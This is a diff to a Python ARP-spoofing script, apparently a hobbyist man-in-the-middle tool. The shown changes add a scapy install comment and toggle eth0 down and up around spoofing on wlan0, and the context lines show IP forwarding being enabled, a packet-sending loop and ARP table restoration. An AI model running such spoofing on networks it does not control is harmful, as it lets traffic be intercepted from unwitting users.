@@ -6,6 +6,8 @@ import time
 import sys
 import os
 
+# pip install scapy
+
 
 def spoof(target_ip, spoof_ip, interface):
     target_mac = get_mac(target_ip, interface)
@@ -39,6 +41,8 @@ def restore_spoof(target_ip, spoof_ip, interface):
 
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 options = get_arguments()
+if options.interface == "wlan0":
+    os.system("ifconfig eth0 down")
 if not options.target:
     print(" J3wker | ARP Spoofing | 2019 ")
     print("-------------------------------------\n")
@@ -50,6 +54,8 @@ if not options.target:
     print("-----")
     options.interface = raw_input("Enter the interface name >> ")
     print("-----")
+    if options.interface == "wlan0":
+        os.system("ifconfig eth0 down")
     try:
         sent_packet_count = 0
         while True:
@@ -66,6 +72,8 @@ if not options.target:
         restore_spoof(options.target, options.spoof, options.interface)
         restore_spoof(options.spoof, options.target, options.interface)
         print("ARP Table is now back to normal")
+        if options.interface == "wlan0":
+            os.system("ifconfig eth0 up")
 else:
     try:
         options = get_arguments()
@@ -82,3 +90,5 @@ else:
         restore_spoof(options.target, options.spoof, options.interface)
         restore_spoof(options.spoof, options.target, options.interface)
         print("ARP Table is now back to normal")
+        if options.interface == "wlan0":
+            os.system("ifconfig eth0 up")
